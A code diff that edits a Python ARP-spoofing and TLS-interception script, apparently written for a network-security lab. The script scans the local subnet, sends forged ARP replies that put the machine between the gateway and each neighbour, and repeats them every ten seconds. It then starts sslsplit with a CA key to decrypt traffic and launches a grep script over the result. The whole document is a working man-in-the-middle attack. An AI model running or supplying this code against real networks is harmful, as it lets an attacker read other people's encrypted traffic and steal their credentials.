@@ -1,10 +1,13 @@
 #!/usr/bin/env python3
 
-from os import system, geteuid
+from os import geteuid
 from sys import exit
 from math import log2
+from time import sleep
+import atexit
 import netifaces as ni
 from scapy.all import ARP, Ether, srp, send
+from subprocess import Popen, DEVNULL
 
 gw = None
 arp_table = {}
@@ -16,6 +19,14 @@ def main():
     task1()
     task2()
     task3()
+    atexit.register(cleanup)
+
+    while True:
+        try:
+            sleep(10)
+            task2()  # Resend ARP spoofing packet
+        except KeyboardInterrupt:
+            exit(0)
 
 
 def task1():
@@ -35,7 +46,7 @@ def task1():
 
     arp = ARP(pdst=net)
     broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
-    results = srp(broadcast / arp, timeout=5, verbose=False)[0]
+    results = srp(broadcast / arp, timeout=3, verbose=False)[0]
 
     for sent, recv in results:
         arp_table[recv.psrc] = recv.hwsrc
@@ -56,14 +67,23 @@ def task2():
 
         arp1 = ARP(op=2, hwdst=arp_table[gw[0]], pdst=gw[0], psrc=neibr)
         arp2 = ARP(op=2, hwdst=arp_table[neibr], pdst=neibr, psrc=gw[0])
-        send(arp1)
-        send(arp2)
+        send(arp1, verbose=False)
+        send(arp2, verbose=False)
 
 
 def task3():
-    system('sudo sslsplit -D -l sslsplit-connections.log ' +
-           '-j sslsplit-jail/ -S sslsplit-log -k ca.key -c ca.crt ' +
-           'ssl 0.0.0.0 8443 tcp 0.0.0.0 8080')
+    Popen(['sslsplit', '-D', '-S', 'sslsplit-log', '-p', 'sslsplit.pid',
+           '-k', 'ca.key', '-c', 'ca.crt', 'ssl', '0.0.0.0', '8443'],
+          stdout=DEVNULL, stderr=DEVNULL)
+    Popen(['./mitm_grep.sh'])
+
+
+def cleanup():
+    print('Cleaning up...')
+    with open('sslsplit.pid') as f:
+        pid = next(f).strip()
+        Popen(['kill', pid])
+        print(f'Kill {pid}')
 
 
 if __name__ == '__main__':
